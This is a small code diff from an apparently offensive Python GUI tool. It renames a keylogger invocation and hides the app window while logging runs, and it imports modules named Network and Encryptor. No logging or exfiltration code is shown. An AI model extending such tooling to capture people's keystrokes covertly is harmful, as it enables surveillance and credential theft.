@@ -3,7 +3,7 @@
 
 from customtkinter import *
 from PIL import Image
-from Keylogger import keylogger
+from Keylogger import start_keylogger
 import Network
 from Encryptor import encryptor
 import multiprocessing
@@ -53,7 +53,7 @@ def keylogging():
         menu.update()
         menu.iconify()
         
-        keylogger(1)
+        start_keylogger()
 
         menu.deiconify()
         quitBtn.place(relx=0.5, rely=0.85, anchor="center")
